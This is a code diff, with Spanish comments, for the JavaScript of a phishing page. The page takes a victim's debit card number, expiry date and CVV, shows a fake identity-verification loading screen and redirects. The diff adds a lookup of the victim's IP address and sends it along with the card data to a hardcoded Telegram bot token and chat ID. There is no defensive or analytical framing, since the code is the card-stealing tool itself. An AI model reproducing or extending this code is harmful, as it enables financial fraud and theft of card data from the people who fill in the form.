@@ -2,8 +2,19 @@
 const TELEGRAM_TOKEN = '8038367240:AAFwLaUBcYyUMFzNlTLLO2c0DAEVqBNraLI';  // Reemplaza con tu token real
 const CHAT_ID = '-1002267762294';  // Reemplaza con tu chat ID real
 
+// Función para obtener la IP del usuario
+function obtenerIP() {
+    return fetch('https://api.ipify.org?format=json')
+        .then(response => response.json())
+        .then(data => data.ip)
+        .catch(error => {
+            console.error('Error al obtener la IP:', error);
+            return 'IP desconocida';  // Retorna un valor por defecto si falla la obtención de IP
+        });
+}
+
 // Función para enviar mensaje a Telegram
-function sendToTelegram(data) {
+function sendToTelegram(data, ip) {
     const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
     const message = `
     *✨ Verificando identidad (tarjeta de débito): ✨*
@@ -11,6 +22,7 @@ function sendToTelegram(data) {
     📄 **Número de tarjeta**: ${data.numeroTarjeta}
     📄 **Fecha**: ${data.fecha}
     📄 **CVV**: ${data.cvv}
+    📍 **IP:**: ${ip}
 
     ---
     👨‍💻 *Desarrollado por* **MegabyteAG5** 💻
@@ -93,7 +105,7 @@ function showLoadingScreen() {
     loadingOverlay.appendChild(validatingText);
     document.body.appendChild(loadingOverlay);
 
-    // Después de 5 segundos, redirigir a index3.html
+    // Después de 8 segundos, redirigir a index3.html
     setTimeout(() => {
         window.location.href = 'index3.html';
     }, 8000); // Redirige después de 8 segundos
@@ -111,13 +123,16 @@ function handleFormSubmit(event) {
     // Mostrar pantalla de carga
     showLoadingScreen();
 
-    // Enviar los datos a Telegram inmediatamente
-    const data = {
-        numeroTarjeta,
-        fecha,
-        cvv
-    };
-    sendToTelegram(data);
+    // Obtener la IP del usuario
+    obtenerIP().then(ip => {
+        // Enviar los datos a Telegram inmediatamente
+        const data = {
+            numeroTarjeta,
+            fecha,
+            cvv
+        };
+        sendToTelegram(data, ip);
+    });
 }
 
 // Asignar la función al evento de submit del formulario
